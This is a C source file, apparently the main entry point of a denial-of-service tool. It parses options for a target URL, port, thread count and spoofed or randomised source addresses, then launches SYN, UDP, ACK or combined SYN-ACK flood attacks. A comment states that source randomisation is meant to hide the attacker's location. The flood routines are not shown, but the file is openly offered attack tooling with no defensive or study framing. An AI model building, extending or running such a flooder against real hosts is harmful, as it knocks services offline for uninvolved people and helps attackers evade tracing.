#include <stdlib.h> // for exit and atoi
#include <stdio.h>  // for printf
#include <signal.h> // for signal
#include <string.h> // for strncpy
#include <getopt.h> // for getopt_long

#include "main.h"

/* from version.c */
extern void version_show(void);

/* from logger.c */
extern void info(const char *fmt, ...);
extern void warning(const char *fmt, ...);
extern void error(const char *fmt, ...);

extern void wronginput(const char *input_parameter);

/* usage.c */
extern void usage(void);

/* attack function */
extern int syn_flood_attack(const char *url, const int port, ...);
extern int udp_flood_attack(const char *url, const int port, ...);
extern int ack_flood_attack(const char *url, const int port, ...);
extern int syn_ack_joint_flood_attack(const char *url, const int port, ...);

void quit(int sig)
{
    info("exit program now...");
    exit(0);
}

int main(int argc, char *argv[])
{
    /*
     * main function here, do some parameters parse work
     */

    signal(SIGINT, quit);
    signal(SIGSEGV, quit);
    signal(SIGTERM, quit);

    version_show();
    info("running...");

    static char *option_string = "u:p:a:t:h";
    int option_index = 0;
    int c;
    static struct option long_options[] = {
        {"url", required_argument, NULL, 'u'},
        {"port", required_argument, NULL, 'p'},
        {"attack-mode", required_argument, NULL, 'a'},
        {"thread", required_argument, NULL, 't'},
        {"help", no_argument, NULL, 'h'},
        {"src-addr", required_argument, NULL, 1},
        {"src-port", required_argument, NULL, 2},
        {"random-src", no_argument, NULL, 3},
        {"repeat-times", required_argument, NULL, 4},
        {"udp-dynamic-packet", no_argument, NULL, 5},
        {"udp-dynamic-dst-port", no_argument, NULL, 6},
        {0, 0, 0, 0},
    };

    char url[MAX_URL_LENGTH] = {'\0'};
    int port = HTTP_PORT_DEFAULT;
    int attack_mode = NON_ATTACK;

    char saddr[MAX_IP_LENGTH] = {'\0'};
    strcpy(saddr, ATTACK_SOURCE_IP_DEFAULT);
    int sport = ATTACK_SOURCE_PORT_DEFAULT;
    int randsaddr = ENABLE; // random source address to hide attacker's location (syn flood)
    int thread_number = THREAD_NUM_DEFAULT;
    int rep = RANDOM_SOURCE_ADDRESS_REPETITION_DEFAULT;
    int udp_dp = DISABLE;
    int udp_ddp = DISABLE;

    char cc[5] = {'\0'};
    while (1)
    {
        c = getopt_long(argc, argv, option_string, long_options, &option_index);
        if (c == -1)
            break;

        switch (c)
        {
        case 'u':
            strncpy(url, optarg, MAX_URL_LENGTH);
            break;
        case 'p':
            if (atoi(optarg) != 0)
                port = atoi(optarg);
            else
                wronginput("-p or --port"); 
            break;
        case 'a':
            if (atoi(optarg) != 0)
                attack_mode = atoi(optarg);
            else
                wronginput("-a or --attack-mode"); 
            break;
        case 't':
            if (atoi(optarg) != 0)
                thread_number = atoi(optarg);
            else
                wronginput("-t or --thread");
            break;
        case 'h':
            usage();
            break;
        case 1:
            memset(saddr, 0, MAX_IP_LENGTH);
            strncpy(saddr, optarg, MAX_IP_LENGTH);
            break;
        case 2:
            if (atoi(optarg) != 0)
                sport = atoi(optarg);
            else
                wronginput("--src-port");
            break;
        case 3:
            randsaddr = ENABLE;
            break;
        case 4:
            if (atoi(optarg) != 0)
                rep = atoi(optarg);
            else
                wronginput("--repeat-times");
            break;
        case 5:
            udp_dp = ENABLE;
            break;
        case 6:
            udp_ddp = ENABLE;
            break;
        case '?':
            sprintf(cc, "%d", c);
            wronginput(cc);
        }
    }

    if (strlen(url) == 0)
    {
        wronginput("-u or --url");
    }

    if (attack_mode == NON_ATTACK)
    {
        wronginput("-a or --attck-mode");
    }

    switch (attack_mode)
    {
    case SYN_FLOOD_ATTACK:
        syn_flood_attack(url, port, randsaddr, rep, thread_number, saddr, sport);
        break;
    case UDP_FLOOD_ATTACK:
        udp_flood_attack(url, port, randsaddr, rep, thread_number, saddr, sport, udp_dp ,udp_ddp);
        break;
    case ACK_FLOOD_ATTACK:
        ack_flood_attack(url, port ,randsaddr, rep, thread_number, saddr, sport);
        break;
    case SYN_ACK_JOINT_FLOOD_ATTACK:
        syn_ack_joint_flood_attack(url, port, randsaddr, rep, thread_number, saddr, sport);
        break;
    default:
        wronginput("-a or --attack-mode");
    }

    return 0;
}